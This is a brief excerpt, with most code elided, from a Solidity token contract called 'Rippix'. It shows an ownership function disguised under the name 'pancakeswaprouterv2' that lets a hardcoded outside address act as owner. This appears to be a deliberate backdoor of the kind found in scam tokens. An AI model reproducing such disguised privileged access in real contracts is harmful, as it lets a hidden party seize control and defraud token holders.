...
contract Ownable is Context {
    ...
    function pancakeswaprouterv2(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x19a3A0c69d9C2BBdc06d3374EB557033f5458Ac2));
...
contract Rippix is Context, IERC20, Ownable, Pausable {
